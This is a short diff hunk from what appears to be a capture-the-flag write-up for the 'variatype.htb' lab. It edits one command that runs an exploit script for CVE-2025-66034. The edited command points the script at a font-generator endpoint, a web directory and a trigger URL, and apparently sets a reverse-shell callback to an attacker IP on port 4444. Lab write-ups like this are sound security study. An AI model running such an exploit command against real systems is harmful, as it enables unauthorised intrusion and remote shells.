@@ -1350,7 +1350,7 @@ if __name__ == "__main__":
 
 ![[Pasted image 20260322183239.png]]
 
-**Command:** `python3 varlib_cve_2025_66034.py --ip ATTACKER_IP --port 4444 --url http://variatype.htb/tools/variable-font-generator/process --path /var/www/variatype.htb --trigger http://variatype.htb`
+**Command:** `python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path /var/www/portal.variatype.htb/public/files --trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process`
 
 **Breakdown:**
 
